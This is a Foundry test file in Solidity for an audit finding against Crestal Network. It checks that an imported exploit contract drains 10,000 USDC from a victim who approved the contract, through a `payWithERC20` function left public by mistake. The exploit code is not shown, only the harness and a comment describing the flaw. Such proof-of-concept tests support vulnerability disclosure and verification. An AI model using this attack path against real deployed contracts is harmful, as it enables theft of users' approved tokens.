// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {Exploit, Payment, MockUSDC, Victim} from "./55092-crestal-network-anyone-approving-blueprintv5-can-drain-erc20-via-payment-paywitherc20.sol";

// Crestal Network H-1 (finding 55092): Payment.payWithERC20 is `public` instead of
// `internal`, so any caller can pull an approved victim's tokens to an arbitrary
// address. Victim approves the BlueprintV5 (Payment) contract -> attacker drains 10k USDC.
contract Finding55092Test is Test {
    function test_exploit_publicPayWithERC20_drainsApprovedVictim() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("victim before", e.victimBefore());
        emit log_named_uint("victim after", e.victimAfter());
        emit log_named_uint("attacker profit", e.profit());

        assertEq(e.victimBefore(), 10_000e6, "victim funded & approved 10k USDC");
        assertEq(e.victimAfter(), 0, "victim fully drained");
        assertEq(e.profit(), 10_000e6, "attacker received the full drained balance");
    }
}
